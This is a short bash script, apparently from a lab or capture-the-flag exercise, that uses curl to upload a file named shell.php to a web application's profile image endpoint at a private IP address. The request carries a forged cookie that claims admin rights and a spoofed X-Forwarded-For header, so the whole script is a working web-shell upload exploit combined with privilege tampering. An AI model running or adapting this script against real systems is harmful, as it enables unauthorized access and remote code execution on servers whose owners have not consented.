#!/bin/bash
TARGET="http://172.20.10.2:3000"
MY_IP="10.0.0.103"
COOKIE="user=admin; user_id=1; isAdmin=true"

# -F: Submit multipart/form-data
# @shell.php: Use the file shell.php for the field 'profile_image'
curl -L -v \
  -H "X-Forwarded-For: $MY_IP" \
  -b "$COOKIE" \
  -F "profile_image=@shell.php" \
  "$TARGET/profile/upload"
